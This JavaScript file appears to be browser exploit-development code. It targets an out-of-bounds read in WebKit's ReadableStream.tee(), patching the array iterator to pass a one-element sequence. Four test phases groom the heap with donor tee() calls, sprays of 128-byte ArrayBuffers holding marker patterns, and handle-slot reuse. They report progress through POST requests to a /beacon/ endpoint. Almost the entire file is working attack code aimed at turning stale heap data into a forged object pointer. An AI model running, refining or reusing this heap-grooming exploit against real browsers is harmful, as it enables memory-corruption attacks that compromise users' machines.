/*
 * p434 -- ReadableStream.tee() OOB heap groom
 *
 * V432-E crashed: uninitialized Vector[1] read -> segfault
 * Vector<Strong<JSObject>> allocates 128 bytes (16 slots * 8 bytes)
 * Only slot 0 is initialized. Slot 1 (bytes 8-15) = stale heap data.
 *
 * Strong<JSObject>::get() = *m_slot -> JSValue -> .asCell() -> JSObject*
 * m_slot is a HandleSlot = JSValue* (pointer to a JSValue in HandleSet)
 * So: stale_bytes -> interpret as JSValue* -> deref -> JSValue -> .asCell() -> JSObject*
 * Double-dereference from stale heap data.
 *
 * Strategy:
 *   Phase 1: Allocate many 128-byte blocks from fastMalloc
 *            (matching Vector's allocation size class)
 *   Phase 2: Write known pattern at offset 8
 *   Phase 3: Free them -> bmalloc MADV_FREE preserves contents
 *   Phase 4: Trigger 1-element tee -> Vector reuses freed block
 *   Phase 5: results[1] reads stale pattern at offset 8
 *
 * Problem: We can't directly allocate 128-byte fastMalloc blocks from JS.
 * But we CAN create many small arrays/strings that hit the same size class.
 * Or better: use the SAME Vector<Strong<JSObject>> allocation via repeated tee()
 *
 * Test plan:
 *   A: Probe the crash -- is it always at the same offset? Wrap in try/catch?
 *   B: Allocate 500 "donor" vectors via tee() with 2 elements, free them,
 *      then do the 1-element tee. Stale slot 1 = a valid HandleSlot from donor.
 *   C: Spray ArrayBuffers at 128 bytes to fill freed blocks, then OOB
 *   D: Info leak: if OOB succeeds, what object type did we get?
 *
 * Beacon prefix: V434-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V434-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// Helper: do a normal 2-element tee (creates a 128-byte Vector with 2 valid Strong<JSObject>)
function normalTee() {
  var rs = new ReadableStream({
    start: function(c) { c.enqueue("x"); c.close(); }
  });
  // Don't intercept -- let it run normally
  return rs.tee();
}

// Helper: 1-element tee (triggers OOB read at offset 8)
function oobTee() {
  var rs = new ReadableStream({
    start: function(c) { c.enqueue("oob"); c.close(); }
  });

  var intercepted = false;
  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      if (typeof self[0] === "object" && self[0] !== null && !(self[0] instanceof ReadableStream)) {
        intercepted = true;
        var items = [self[0]]; // 1 element only
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    Array.prototype[Symbol.iterator] = origIter;
    return branches;
  } catch(e) {
    Array.prototype[Symbol.iterator] = origIter;
    return null;
  }
}

// ================================================================
// Test A: Donor vector grooming
// Create many tee() calls to fill bmalloc with 128-byte blocks
// containing valid HandleSlot at offset 8. Then free, then OOB.
// ================================================================

function testA() {
  B("A-START");

  // Phase 1: Create many donor tees
  // Each tee() internally creates a Vector<Strong<JSObject>> with 2 elements
  // The vector's 128-byte data block has: [HandleSlot0, HandleSlot1, ...]
  // HandleSlot1 at offset 8 is a valid JSValue* pointing into HandleSet
  var donors = [];
  for (var i = 0; i < 200; i++) {
    try {
      donors.push(normalTee());
    } catch(e) {
      B("A-DONOR-ERR", {i: i, e: e.message.slice(0, 40)});
      break;
    }
  }
  B("A-DONORS", donors.length);

  // Phase 2: Release donors to free their internal vectors
  // The Vector<Strong<JSObject>> is a local in SequenceConverter::convert
  // It's destroyed when convert() returns. So the 128-byte blocks are
  // ALREADY freed by the time we get the ReadableStream results.
  // We need a different approach: the Vector data is freed, but the
  // Strong<JSObject> handles in the HandleSet are also freed when
  // the Strong destructors run. So stale HandleSlots may point to
  // freed HandleSet entries.

  // Actually: the Vector is a return value that's moved into the
  // std::pair. Let me reconsider...
  // InternalReadableStream::tee() creates the Vector, extracts results[0]
  // and results[1], and returns a std::pair of InternalReadableStream.
  // The Vector destructor runs, which destroys the Strong<JSObject> entries.
  // The 128-byte data block is freed to fastMalloc.
  // The HandleSlots in HandleSet for those Strong<> are also freed.

  // So after tee() returns, the 128-byte block is FREE in bmalloc,
  // and its contents (the old HandleSlot values) remain (MADV_FREE).
  // If we call tee() again, the NEW Vector allocation will reuse
  // one of these freed blocks.

  // The problem: the stale HandleSlot at offset 8 points to a
  // HandleSet entry that was also freed. Dereferencing it may crash.

  // UNLESS: the HandleSet entry was reallocated for a new handle.
  // HandleSet reuses freed slots. So if we create enough new handles
  // AFTER freeing the donors, the old HandleSlot address may now
  // point to a live handle containing a different JSValue.

  // Strategy: create new handles after donors are freed
  // Strong<JSObject> is created when we do tee() with 2 elements
  // Each tee creates 2 Strong<JSObject> handles
  // We need to allocate handles that reuse the freed HandleSet slots

  // Phase 3: Create "filler" handles to occupy freed HandleSet slots
  var fillers = [];
  for (var i = 0; i < 400; i++) {
    // Each normalTee creates 2 handles, then the Vector destructor frees them
    // But the ReadableStream wrappers still hold InternalReadableStream objects
    // which hold Weak<JSObject> handles... hmm

    // Actually let's use a different approach: create Strong<> handles
    // indirectly by creating objects that use HandleSet
    fillers.push(new ReadableStream({
      start: function(c) { c.enqueue("fill-" + i); c.close(); }
    }));
  }
  B("A-FILLERS", fillers.length);

  // Phase 4: Now do the 1-element OOB tee
  // The Vector allocation should reuse a freed 128-byte block
  // Offset 8 has a stale HandleSlot that NOW may point to a live handle
  try {
    var result = oobTee();
    if (result) {
      B("A-OOB-OK!!!", {
        len: result.length,
        type0: result[0] ? result[0].constructor.name : "null",
        type1: result[1] ? result[1].constructor.name : "null"
      });

      if (result[1]) {
        try {
          var isRS = result[1] instanceof ReadableStream;
          B("A-OOB-RS", isRS);
        } catch(e) {
          B("A-OOB-RS-ERR", e.message.slice(0, 60));
        }

        try {
          B("A-OOB-LOCKED", result[1].locked);
        } catch(e) {
          B("A-OOB-LOCKED-ERR", e.message.slice(0, 60));
        }
      }
    } else {
      B("A-OOB-NULL");
    }
  } catch(e) {
    B("A-OOB-CRASH", e.message.slice(0, 80));
  }

  B("A-DONE");
}

// ================================================================
// Test B: ArrayBuffer spray at 128 bytes
// AB backing stores come from bmalloc (Gigacage disabled).
// Fill 128-byte blocks with controlled data, free, tee OOB.
// The stale bytes at offset 8 = our controlled AB content.
// ================================================================

function testB() {
  B("B-START");

  // Phase 1: Spray 128-byte ArrayBuffers
  var abs = [];
  for (var i = 0; i < 1000; i++) {
    var ab = new ArrayBuffer(128);
    var view = new DataView(ab);
    // Write a known pattern at offset 8 (where Vector[1] will read)
    // This needs to be a valid JSValue* (pointer to memory containing a JSValue)
    // For testing, write 0x4141414141414141 -- will crash but shows control
    view.setFloat64(8, 1.8457939563e-314, true); // 0x4141414141414141 in little-endian
    // Actually let's write something we can identify in crash
    view.setUint32(0, 0xDEAD0000 + (i & 0xFFFF), true);
    view.setUint32(4, 0xBEEF0000 + (i & 0xFFFF), true);
    view.setUint32(8, 0xCAFE0000 + (i & 0xFFFF), true);
    view.setUint32(12, 0xF00D0000 + (i & 0xFFFF), true);
    abs.push(ab);
  }
  B("B-SPRAY", abs.length);

  // Phase 2: Free half (create holes in the 128-byte size class)
  for (var i = 0; i < abs.length; i += 2) {
    abs[i] = null;
  }

  // Force GC to reclaim freed ABs
  for (var i = 0; i < 200; i++) new ArrayBuffer(256);
  B("B-FREE-DONE");

  // Phase 3: OOB tee -- Vector should reuse a freed 128-byte AB block
  try {
    var result = oobTee();
    if (result) {
      B("B-OOB-OK!!!", {
        len: result.length,
        type1: result[1] ? result[1].constructor.name : "null"
      });
    } else {
      B("B-OOB-NULL");
    }
  } catch(e) {
    B("B-OOB-CRASH", e.message.slice(0, 80));
  }

  B("B-DONE");
}

// ================================================================
// Test C: Controlled OOB via normal 2-elem tee followed by 1-elem
// The idea: do many 2-element tees. Each creates a 128-byte Vector
// with 2 valid HandleSlots. After tee() returns, Vector is freed.
// Immediately do a 1-element tee. New Vector reuses same block.
// Offset 8 still has the old HandleSlot from the previous tee.
// Since HandleSet doesn't clear freed handles, the old HandleSlot
// STILL points to a valid JSValue in the HandleSet (which is now freed).
// Race: do a 2-elem tee to put fresh handles in the HandleSet,
// then immediately 1-elem tee to read the stale slot.
// ================================================================

function testC() {
  B("C-START");

  // Do rapid tee() cycles. Each 2-elem tee populates HandleSet entries.
  // When the Vector is destroyed, the HandleSet entries are freed.
  // If a 1-elem tee Vector lands in the same block, the stale data
  // at offset 8 is the freed HandleSlot value.

  // But freed HandleSlot points to freed HandleSet memory.
  // We need the HandleSet memory to be REALLOCATED to something else.

  // Alternative: keep references to tee branches so the underlying
  // InternalReadableStream (and its Weak<JSObject> handle) stays alive.
  // Then the HandleSlot at offset 8 points to a LIVE handle.

  // Wait -- the Vector's Strong<JSObject> handles are separate from
  // InternalReadableStream's Weak<JSObject> handles. The Strong handles
  // are created during Vector construction and destroyed when Vector dies.
  // The InternalReadableStream takes the JSObject reference via fromObject()
  // which creates a NEW Weak<JSObject> handle, independent of the Vector's.

  // So the Vector's HandleSlots are always freed after tee() returns.
  // The stale data at offset 8 is a freed HandleSlot.
  // Dereferencing it reads freed HandleSet memory.
  // If HandleSet memory is reused for something else, we get a type confusion.

  // Strategy: between 2-elem tee (fills block) and 1-elem tee (reads block),
  // allocate many objects into the HandleSet to reuse the freed handle slots.

  // First, fill a block
  normalTee(); // Creates+destroys 128-byte Vector, frees HandleSlots

  // Now allocate many handles to reuse the freed HandleSet entries
  var holders = [];
  for (var i = 0; i < 100; i++) {
    holders.push({});  // Plain objects don't create handles
  }
  // Create objects that DO create handles: Strong<> via tee() or other paths
  for (var i = 0; i < 50; i++) {
    normalTee(); // each creates+destroys handles
  }
  B("C-PREP", holders.length);

  // Now 1-elem tee
  try {
    var result = oobTee();
    if (result) {
      B("C-OOB-OK!!!", {
        type1: result[1] ? result[1].constructor.name : "null"
      });
      if (result[1]) {
        try {
          B("C-OOB-LOCKED", result[1].locked);
        } catch(e) {
          B("C-OOB-LOCKED-ERR", e.message.slice(0, 60));
        }
        try {
          var r = result[1].getReader();
          B("C-OOB-READER!!!");
        } catch(e) {
          B("C-OOB-READER-ERR", e.message.slice(0, 60));
        }
      }
    } else {
      B("C-OOB-NULL");
    }
  } catch(e) {
    B("C-OOB-CRASH", e.message.slice(0, 80));
  }

  B("C-DONE");
}

// ================================================================
// Test D: Keep branch references alive so HandleSlots persist
// The Vector Strong<> handles are temporary, BUT if we create another
// Vector in the same allocation with Strong<> that point to objects
// WE keep alive, then those HandleSlot entries persist in HandleSet.
// When freed from the Vector but NOT from HandleSet (because we hold
// another Strong<> to the same objects), the HandleSlot VALUE at
// that memory address is still valid.
//
// Wait: HandleSlot is JSValue*. The value stored in the Vector data
// is the HandleSlot pointer (address in HandleSet). If the HandleSet
// entry is freed, that address may be reused. But the VALUE written
// at that address (the JSValue) may still be intact (MADV_FREE).
// So the double-deref: stale HandleSlot ptr -> freed but intact
// HandleSet entry -> old JSValue -> asCell() -> JSObject*
// ================================================================

function testD() {
  B("D-START");

  // This test: cycle many tee() calls rapidly to see if any succeeds
  var attempts = 0;
  var success = false;

  function tryOOB() {
    if (attempts >= 20 || success) {
      B("D-DONE", {attempts: attempts, success: success});
      return;
    }

    // Do 5 normal tees to populate blocks
    for (var i = 0; i < 5; i++) normalTee();

    attempts++;
    try {
      var result = oobTee();
      if (result && result[1]) {
        success = true;
        B("D-OOB-SUCCESS!!!", {
          attempt: attempts,
          type1: result[1].constructor.name
        });

        // Inspect what we got
        try {
          B("D-OOB-LOCKED", result[1].locked);
        } catch(e) {
          B("D-OOB-LOCKED-ERR", e.message.slice(0, 60));
        }

        try {
          var r = result[1].getReader();
          B("D-OOB-READER!!!");
          r.read().then(function(res) {
            B("D-OOB-READ", {done: res.done, val: typeof res.value});
          }).catch(function(e) {
            B("D-OOB-READ-ERR", e.message.slice(0, 60));
          });
        } catch(e) {
          B("D-OOB-READER-ERR", e.message.slice(0, 60));
        }
        return;
      }
      B("D-ATTEMPT-" + attempts + "-NULL");
    } catch(e) {
      B("D-ATTEMPT-" + attempts + "-CRASH", e.message.slice(0, 40));
    }

    setTimeout(tryOOB, 50);
  }

  tryOOB();
}

// Run tests sequentially with recovery time between crashes
testA();
setTimeout(function() { testB(); }, 3000);
setTimeout(function() { testC(); }, 6000);
setTimeout(function() { testD(); }, 9000);
setTimeout(function() { B("DONE"); }, 15000);
})();
